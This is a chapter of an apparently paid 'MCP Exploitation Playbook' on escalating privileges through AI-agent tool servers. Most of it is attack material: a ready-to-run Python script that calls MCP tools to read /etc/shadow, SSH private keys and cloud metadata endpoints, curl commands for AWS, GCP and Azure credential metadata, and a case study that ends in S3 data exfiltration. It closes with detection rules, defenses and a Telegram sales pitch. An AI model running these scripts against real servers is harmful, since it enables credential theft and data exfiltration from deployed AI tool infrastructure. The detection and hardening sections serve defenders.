# Chapter 02 — Permission Escalation
## The 9099 Files — MCP Exploitation Playbook

---

## What It Is

MCP tools are scoped to specific permissions — a tool can read files, run commands, make network requests. When those tools are combined, or when their underlying service account has excessive privileges, an attacker can use one tool to escalate to another level of access.

The principle: MCP servers run under a service identity. That identity has permissions. Tools expose those permissions. If any tool has more access than it needs, you can use it to reach what the others can't touch.

---

## Why This Works

Most MCP server deployments give the service account broad permissions because scoping permissions per-tool is complex. The result: a file read tool can also read credentials files. A network tool can reach cloud metadata endpoints. An exec tool can run as root.

You're not exploiting a bug in the code. You're exploiting an architectural decision: tools were given more privilege than the minimum required.

---

## The Attack

### Step 1 — Map the Permission Surface

```bash
# Enumerate all tools and their apparent scope
curl -s http://target-mcp-server/.well-known/mcp.json | python3 -m json.tool

# Look for these high-value targets:
# - exec / run / shell — command execution
# - sudo / admin — elevated privileges
# - read_any / file_read_all — files outside intended scope
# - network_request / http_fetch — network access
# - credential_read — secrets access
```

### Step 2 — Test Lateral Movement

```python
#!/usr/bin/env python3
"""
MCP Permission Escalation Tester
Tests whether a low-privilege tool can be used to access what other tools expose
"""
import requests
import json
import sys
import os

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"

TOOLS_TO_TEST = {
    # Tool name: high-value path that tool might reach
    "file_read": ["/etc/passwd", "/root/.ssh/id_rsa", "/app/config/creds.json"],
    "exec": ["/bin/sh", "id", "cat /etc/shadow"],
    "network_fetch": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/"],
    "list_dir": ["/", "/root", "/app"],
    "git_clone": ["/etc/shadow", "root@localhost:/root"],
}

def test_tool_escalation(target, tool_name, paths):
    """Try to access high-value paths through a tool"""
    results = []
    for path in paths:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": tool_name,
                "arguments": {"path": path}
            }
        }
        try:
            r = requests.post(f"{target}/mcp/call", json=payload, timeout=10)
            result = r.json()
            resp_str = json.dumps(result)
            # Check for successful data exfiltration
            if "root:" in resp_str or "ssh-rsa" in resp_str or "shadow" in resp_str.lower():
                results.append(f"[!] ESCALATED: {tool_name} -> {path}")
                results.append(f"    Response: {resp_str[:500]}")
            elif "error" not in resp_str and resp_str != '{"result":{}}':
                results.append(f"[~] Sensitive-ish: {tool_name} -> {path}: {resp_str[:200]}")
        except Exception as e:
            pass
    return results

def main():
    print(f"[*] MCP Permission Escalation Tester")
    print(f"[*] Target: {TARGET}\n")
    
    # First enumerate tools
    try:
        r = requests.get(f"{TARGET}/.well-known/mcp.json", timeout=5)
        tools = r.json().get('tools', [])
    except:
        print("[-] Could not enumerate tools. Check target.")
        return
    
    print(f"[*] Found {len(tools)} tools. Testing escalation paths...\n")
    
    all_results = {}
    for tool in tools:
        tname = tool.get('name', 'unknown')
        if tname in TOOLS_TO_TEST:
            print(f"[*] Testing escalation via: {tname}")
            results = test_tool_escalation(TARGET, tname, TOOLS_TO_TEST[tname])
            if results:
                all_results[tname] = results
    
    if all_results:
        print("\n[!] ESCALATION PATHS FOUND:")
        for tool, findings in all_results.items():
            print(f"\n{tool}:")
            for f in findings:
                print(f"  {f}")
    else:
        print("\n[-] No obvious escalation paths found.")

if __name__ == "__main__":
    main()
```

Save as `mcp_escalation.py`.

### Step 3 — Check Cloud Metadata

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/user-data/

# GCP
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=..."

# Azure
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

If any of these return data, you have cloud credential access through the MCP service account. This is SSRF territory (Chapter 03), but the path is through tool permissions, not direct injection.

### Step 4 — Document

For each successful escalation path:
- Which tool you used
- Which privilege level it reached
- What data you accessed
- The service account context

---

## Real Case

**Attack chain in a real MCP deployment:**
1. file_read tool scoped to `/project/` directory
2. Application config at `/project/../config/credentials.json` readable
3. Credentials included AWS keys with s3:* permissions
4. Keys used to list buckets, find backups, exfil data

The tool was not "supposed" to read outside `/project/`. But path traversal is not blocked. The permission escalation happened because no input validation on the path argument.

---

## Detection Rules

### KQL — Sentinel

```kql
// Flag tool calls accessing paths outside defined scopes
MCP_ToolInputs
| where ToolName == "file_read"
    and (FilePath startswith "/root"
         or FilePath contains "/.ssh"
         or FilePath contains "/etc/shadow"
         or FilePath contains "..")
| project TimeGenerated, ToolName, FilePath, SourceIP, UserAgent
```

### Sigma Rule

```yaml
title: MCP Permission Escalation Detected
log_source: mcp_server
detection:
  selection:
    event.type: tool_call
    tool.name:
      - file_read
      - exec
      - shell
    file.path|contains:
      - /root/
      - /.ssh/
      - /etc/shadow
      - /proc/
  condition: selection
level: high
```

---

## Defenses

1. **Least privilege per tool** — Each tool should run with exactly the permissions it needs, nothing more. Use separate service accounts per tool if necessary.

2. **Path boundary enforcement** — MCP server should validate all file paths against a defined root directory. Block `..` traversal at the server level, not just the tool level.

3. **No sensitive paths accessible via any tool** — `/etc/shadow`, `/.ssh/`, cloud metadata endpoints should return 403 on every tool, regardless of service account context.

4. **Cloud IAM scoping** — MCP service accounts should have no IAM permissions beyond what's strictly required. Test with `aws sts get-caller-identity` — if it succeeds without error, your service account is overprivileged.

5. **Audit all tools for excessive scope** — Review each tool's permission requirements. If a "read project files" tool needs access to `/`, it was misconfigured.

---

**$29 USDT — Full Playbook with 10 Chapters**

TX hash to `@hunnidinnit` on Telegram.